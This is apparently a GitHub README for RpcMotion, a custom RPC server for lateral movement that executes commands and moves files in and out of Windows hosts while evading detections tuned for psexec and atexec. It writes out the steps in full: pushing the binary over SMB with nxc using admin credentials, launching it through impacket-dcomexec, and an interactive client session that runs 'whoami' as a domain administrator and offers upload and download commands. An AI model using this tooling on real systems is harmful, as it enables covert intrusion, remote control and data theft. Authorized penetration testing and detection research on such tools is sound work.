# RpcMotion
Execute commands, in/exfiltrate files using your custom RPC Server

<img width="614" height="389" alt="изображение" src="https://github.com/user-attachments/assets/288192c7-3cad-41d6-9395-2b96e85a079f" />

This project demonstrates an example of a custom RPC server that you can use for your own purposes, potentially bypassing known detections of command execution via psexec, atexec, and others.

Check more details [here](https://cicada-8.medium.com/impacket-developer-guide-part-3-make-your-own-lateral-movement-a2f8181f657b?postPublishedType=initial)

# Usage
Deploy RPC Server as u wish. For example:
```shell
nxc smb office.local -u admin -p admin --put-file /root/RpcMotion.exe c:\rpcmotion.exe

impacket-dcomexec.py -nooutput admin:admin@10.10.10.10 "c:\rpcmotion.exe"

# or wmiexec. In the logs will be cmd.exe /Q /c c:\rpcmotion.exe
```

Then connect and do pentest!
```shell
┌──(root㉿WIN-PC)-[~]
└─# python client.py --host office.local --port 12345 --interactive
Interactive RPC Shell (type 'help' for commands, 'exit' to quit)

RPC> ls
[+] Directory listing:
Directory listing:
[FILE] desktop.ini
[FILE] Process Hacker 2.lnk
[DIR]  python-3.14.0a1-embed-amd64
[FILE] RpcMotion.exe
[DIR]  test


RPC> ls c:\
[+] Directory listing:
Directory listing:
[DIR]  $Recycle.Bin
[DIR]  allaceess
[FILE] bootmgr
[FILE] BOOTNXT
[DIR]  Documents and Settings
[DIR]  Drivers
[DIR]  ExchangeSetupLogs
[DIR]  Logs
[FILE] pagefile.sys
[DIR]  PerfLogs
[DIR]  Program Files
[DIR]  Program Files (x86)
[DIR]  ProgramData
[DIR]  Recovery
[DIR]  System Volume Information
[DIR]  temp
[DIR]  Users
[DIR]  Windows


RPC> help
Available commands:
  help                    Show this help
  exit, quit             Exit shell
  connect <host> <port>  Connect to server
  disconnect             Disconnect from server
  exec <command>         Execute command with output
  silent <command>       Execute command without output
  upload <local> <remote> Upload file to server
  download <remote> <local> Download file from server
  ls [path]              List directory
  shutdown               Shutdown server
  ping                   Ping server
  status                 Show connection status

RPC> exec whoami
[+] Command output:
office\administrator


RPC> exit
```
